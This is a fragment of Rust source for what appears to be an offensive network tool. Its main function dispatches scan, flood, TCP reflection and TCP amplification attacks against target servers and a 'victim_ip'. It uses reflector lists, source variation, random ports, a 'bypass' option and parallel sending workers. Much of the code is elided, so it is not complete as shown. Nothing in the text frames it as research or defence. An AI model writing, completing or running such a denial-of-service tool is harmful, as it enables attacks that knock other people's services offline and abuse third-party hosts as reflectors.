...
struct Args {
    ...
    #[arg(short = 'w', long, default_value = "1", help = "Worker threads for parallel sending (1-8)")]
    workers: usize,
}
...
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    ...
    let workers = args.workers.clamp(1, 8);
    if workers > 1 {
    ...
    match args.attack_type.as_str() {
        "scan" => {
            ...
            for &(target_ip, port) in &servers {
                ...
                session::run_port_scan(&iface, src_mac, src_ip, dmac, target_ip,
                    ...
                    args.source_variation, args.random_ports, Arc::clone(&stats), &mut bypass, Arc::clone(&shutdown), workers).await;
            }
        }
        "flood" => {
        ...
        "reflect" => {
            ...
            reflection::run_tcp_reflection(&iface, src_mac, src_ip, dst_mac, victim_ip,
                &reflectors, args.reflector_port, args.duration, delay_ms, Arc::clone(&stats), Arc::clone(&shutdown)).await;
        }
        "amplify" => {
            ...
            for &(target_ip, _) in &servers {
                ...
                let amp = amplify::run_tcp_amplify(&iface, src_mac, src_ip, dmac,
                    ...
                    args.duration, delay_ms, Arc::clone(&stats), Arc::clone(&shutdown)).await;
